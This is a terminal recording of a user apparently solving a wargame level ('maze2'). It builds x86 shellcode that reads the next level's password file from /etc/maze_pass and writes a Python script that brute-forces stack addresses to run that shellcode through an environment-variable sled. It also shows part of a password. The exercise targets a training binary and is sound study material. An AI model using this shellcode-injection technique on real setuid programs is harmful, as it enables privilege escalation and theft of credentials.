[12.863, "o", "cd /tmp; rm -rf l2exp; mkdir l2exp; cd l2exp\r\n\u001b[?2004l\r\u001b]3008;start=ef03c011-8f43-4479-8132-952d7b06a4af;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=maze2;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/maze2\u001b\\\u001b]3008;end=ef03c011-8f43-4479-8132-952d7b06a4af;exit=success\u001b\\\u001b]3008;start=efd481d7-8672-4589-a403-a7b0fd76a73e;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=maze2;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/tmp/l2exp\u001b\\\u001b[?2004h\u001b]0;maze2@maze: /tmp/l2exp\u0007maze2@maze:/tmp/l2exp$ "]
[38.765, "o", "cat > sc.py <<'EOF'\r\n\u001b[?2004l\r\u001b[?2004h> # corrected pass-reader shellcode, 71 bytes, NUL-free.\r\n\u001b[?2004l\r\u001b[?2004h> # the path dwords are pushed in REVERSE chunk order (aze3 first, /etc last)\r\n\u001b[?2004l\r\u001b[?2004h> # so the stack holds \"/etc/maze_pass/maze3\\0\" forwards for open().\r\n\u001b[?2004l\r\u001b[?2004h> # (the earlier 85-byte attempt pushed them forward -> ENOENT -> empty output)\r\n\u001b[?2004l\r\u001b[?2004h> sc = bytes([\r\n\u001b[?2004l\r\u001b[?2004h>  0x31,0xc0,0x50,                                  # xor eax,eax; push 0        (NUL terminator)\r\n\u001b[?2004l\r\u001b[?2004h>  0x68,0x61,0x7a,0x65,0x33,                        # push 'aze3'\r\n\u001b[?2004l\r\u001b[?2004h>  0x68,0x73,0x73,0x2f,0x6d,                        # push 'ss/m'\r\n\u001b[?2004l\r\u001b[?2004h>  0x68,0x65,0x5f,0x70,0x61,                        # push 'e_pa'\r\n\u001b[?2004l\r\u001b[?2004h>  0x68,0x2f,0x6d,0x61,0x7a,                        # push '/maz'\r\n\u001b[?2004l\r\u001b[?2004h>  0x68,0x2f,0x65,0x74,0x63,                        # push '/etc'\r\n\u001b[?2004l\r\u001b[?2004h>  0x89,0xe3,                                       # mov ebx, esp  (path)\r\n\u001b[?2004l\r\u001b[?2004h>  0x31,0xc9,                                       # xor ecx, ecx  (fd 0)\r\n\u001b[?2004l\r\u001b[?2004h>  0xb0,0x05,0xcd,0x80,                             # open(\"/etc/maze_pass/maze3\")\r\n\u001b[?2004l\r\u001b[?2004h>  0x89,0xc3,                                       # mov ebx, eax  (fd)\r\n\u001b[?2004l\r\u001b[?2004h>  0x83,0xec,0x40,                                  # sub esp, 0x40\r\n\u001b[?2004l\r\u001b[?2004h>  0x89,0xe1,                                       # mov ecx, esp  (buf)\r\n\u001b[?2004l\r\u001b[?2004h>  0x31,0xd2,0xb2,0x3c,                             # xor edx, edx; bpl 0x3c\r\n\u001b[?2004l\r\u001b[?2004h>  0xb0,0x03,0xcd,0x80,                             # read(fd, buf, 0x3c)\r\n\u001b[?2004l\r\u001b[?2004h>  0x92,                                          # xchg edx, eax (count)\r\n\u001b[?2004l\r\u001b[?2004h>  0x31,0xdb,0x43,0xb0,0x04,0xcd,0x80,               # xor ebx,ebx; inc; write(fd,buf,count)\r\n\u001b[?2004l\r\u001b[?2004h>  0x31,0xdb,0xb3,0x02,0xb0,0x04,0xcd,0x80,          # write to stderr too\r\n\u001b[?2004l\r\u001b[?2004h>  0xb0,0x01,0xcd,0x80,                              # exit\r\n\u001b[?2004l\r\u001b[?2004h> ])\r\n\u001b[?2004l\r\u001b[?2004h> open('sc.bin','wb').write(sc)\r\n\u001b[?2004l\r\u001b[?2004h> print(len(sc), 'bytes')\r\n\u001b[?2004l\r\u001b[?2004h> EOF\r\n\u001b[?2004l\r\u001b]3008;start=2c32f7b3-ddd6-4534-80fe-7dd6f065cde9;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=maze2;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/tmp/l2exp\u001b\\\u001b]3008;end=2c32f7b3-ddd6-4534-80fe-7dd6f065cde9;exit=success\u001b\\\u001b]3008;start=efd481d7-8672-4589-a403-a7b0fd76a73e;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=maze2;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/tmp/l2exp\u001b\\\u001b[?2004h\u001b]0;maze2@maze: /tmp/l2exp\u0007maze2@maze:/tmp/l2exp$ "]
[40.734, "o", "python3 sc.py && xxd sc.bin\r\n\u001b[?2004l\r\u001b]3008;start=b7616c63-8337-42ad-b1a0-fcd848e21db0;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=maze2;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/tmp/l2exp\u001b\\71 bytes\r\n00000000: \u001b[1;32m31\u001b[0m\u001b[1;31mc0\u001b[0m \u001b[1;32m5068\u001b[0m \u001b[1;32m617a\u001b[0m \u001b[1;32m6533\u001b[0m \u001b[1;32m6873\u001b[0m \u001b[1;32m732f\u001b[0m \u001b[1;32m6d68\u001b[0m \u001b[1;32m655f\u001b[0m  \u001b[1;32m1\u001b[0m\u001b[1;31m.\u001b[0m\u001b[1;32mPhaze3hss/mhe_\u001b[0m\r\n00000010: \u001b[1;32m7061\u001b[0m \u001b[1;32m682f\u001b[0m \u001b[1;32m6d61\u001b[0m \u001b[1;32m7a68\u001b[0m \u001b[1;32m2f65\u001b[0m \u001b[1;32m7463\u001b[0m \u001b[1;31m89e3\u001b[0m \u001b[1;32m31\u001b[0m\u001b[1;31mc9\u001b[0m  \u001b[1;32mpah/mazh/etc\u001b[0m\u001b[1;31m..\u001b[0m\u001b[1;32m1\u001b[0m\u001b[1;31m.\u001b[0m\r\n00000020: \u001b[1;31mb005\u001b[0m \u001b[1;31mcd80\u001b[0m \u001b[1;31m89c3\u001b[0m \u001b[1;31m83ec\u001b[0m \u001b[1;32m40\u001b[0m\u001b[1;31m89\u001b[0m \u001b[1;31me1\u001b[0m\u001b[1;32m31\u001b[0m \u001b[1;31md2b2\u001b[0m \u001b[1;32m3c\u001b[0m\u001b[1;31mb0\u001b[0m  \u001b[1;31m........\u001b[0m\u001b[1;32m@\u001b[0m\u001b[1;31m..\u001b[0m\u001b[1;32m1\u001b[0m\u001b[1;31m..\u001b[0m\u001b[1;32m<\u001b[0m\u001b[1;31m.\u001b[0m\r\n00000030: \u001b[1;31m03cd\u001b[0m \u001b[1;31m8092\u001b[0m \u001b[1;32m31\u001b[0m\u001b[1;31mdb\u001b[0m \u001b[1;32m43\u001b[0m\u001b[1;31mb0\u001b[0m \u001b[1;31m04cd\u001b[0m \u001b[1;31m80\u001b[0m\u001b[1;32m31\u001b[0m \u001b[1;31mdbb3\u001b[0m \u001b[1;31m02b0\u001b[0m  \u001b[1;31m....\u001b[0m\u001b[1;32m1\u001b[0m\u001b[1;31m.\u001b[0m\u001b[1;32mC\u001b[0m\u001b[1;31m....\u001b[0m\u001b[1;32m1\u001b[0m\u001b[1;31m....\u001b[0m\r\n00000040: \u001b[1;31m04cd\u001b[0m \u001b[1;31m80b0\u001b[0m \u001b[1;31m01cd\u001b[0m \u001b[1;31m80\u001b[0m             \u001b[1;31m         \u001b[0m  \u001b[1;31m.......\u001b[0m\r\n\u001b]3008;end=b7616c63-8337-42ad-b1a0-fcd848e21db0;exit=success\u001b\\\u001b]3008;start=efd481d7-8672-4589-a403-a7b0fd76a73e;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=maze2;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/tmp/l2exp\u001b\\\u001b[?2004h\u001b]0;maze2@maze: /tmp/l2exp\u0007maze2@maze:/tmp/l2exp$ "]
[62.609, "o", "cat > sweep.py <<'EOF'\r\n\u001b[?2004l\r\u001b[?2004h> import os, struct, subprocess\r\n\u001b[?2004l\r\u001b[?2004h> sc = open('sc.bin','rb').read()\r\n\u001b[?2004l\r\u001b[?2004h> # the P env var holds a 2000-byte 'A' sled + the shellcode; the 8 bytes of\r\n\u001b[?2004l\r\u001b[?2004h> # argv[1] (strncpy'd into the executed buf) are push imm32; ret -> absolute\r\n\u001b[?2004l\r\u001b[?2004h> # stack address. Sweep 8-aligned targets; the first one that lands in the\r\n\u001b[?2004l\r\u001b[?2004h> # env sled runs the shellcode, which prints the password (twice: fd1+fd2).\r\n\u001b[?2004l\r\u001b[?2004h> base = {k.encode(): v.encode() for k, v in os.environ.items()}\r\n\u001b[?2004l\r\u001b[?2004h> # start near the previously-measured hit so the live sweep stays short\r\n\u001b[?2004l\r\u001b[?2004h> t = 0xffffd000\r\n\u001b[?2004l\r\u001b[?2004h> n = 0\r\n\u001b[?2004l\r\u001b[?2004h> while t <= 0xfffff000:\r\n\u001b[?2004l\r\u001b[?2004h>     ib = struct.pack('<I', t)\r\n\u001b[?2004l\r\u001b[?2004h>     t += 8\r\n\u001b[?2004l\r\u001b[?2004h>     if 0 in ib: continue\r\n\u001b[?2004l\r\u001b[?2004h>     env = dict(base)\r\n\u001b[?2004l\r\u001b[?2004h>     env[b'P'] = b'A'*2000 + sc\r\n\u001b[?2004l\r\u001b[?2004h>     arg = b'\\x68' + ib + b'\\xc3' + b'AA'   # push imm32; ret; 2 pad bytes\r\n\u001b[?2004l\r\u001b[?2004h>     n += 1\r\n\u001b[?2004l\r\u001b[?2004h>     try:\r\n\u001b[?2004l\r\u001b[?2004h>         p = subprocess.run(['/maze/maze2', arg], input=b'',\r\n\u001b[?2004l\r\u001b[?2004h>                            env=env, capture_output=True, timeout=5)\r\n\u001b[?2004l\r\u001b[?2004h>         out = (p.stdout or b'') + (p.stderr or b'')\r\n\u001b[?2004l\r\u001b[?2004h>         if b'pKWcO3NfC6' in out:\r\n\u001b[?2004l\r\u001b[?2004h>             open('hit.txt','w').write('%08x' % (t-8))\r\n\u001b[?2004l\r\u001b[?2004h>             print('HIT at 0x%08x after %d targets' % (t-8, n))\r\n\u001b[?2004l\r\u001b[?2004h>             print('output:', out.decode('latin-1','replace').strip())\r\n\u001b[?2004l\r\u001b[?2004h>             break\r\n\u001b[?2004l\r\u001b[?2004h>     except Exception:\r\n\u001b[?2004l\r\u001b[?2004h>         pass\r\n\u001b[?2004l\r\u001b[?2004h> else:\r\n\u001b[?2004l\r\u001b[?2004h>     print('no hit in', n, 'targets')\r\n\u001b[?2004l\r\u001b[?2004h> EOF\r\n\u001b[?2004l\r\u001b]3008;start=b1cca90b-81d4-4728-9c2a-1bacb77c69e5;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=maze2;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/tmp/l2exp\u001b\\\u001b]3008;end=b1cca90b-81d4-4728-9c2a-1bacb77c69e5;exit=success\u001b\\\u001b]3008;start=efd481d7-8672-4589-a403-a7b0fd76a73e;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=maze2;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/tmp/l2exp\u001b\\\u001b[?2004h\u001b]0;maze2@maze: /tmp/l2exp\u0007maze2@maze:/tmp/l2exp$ "]
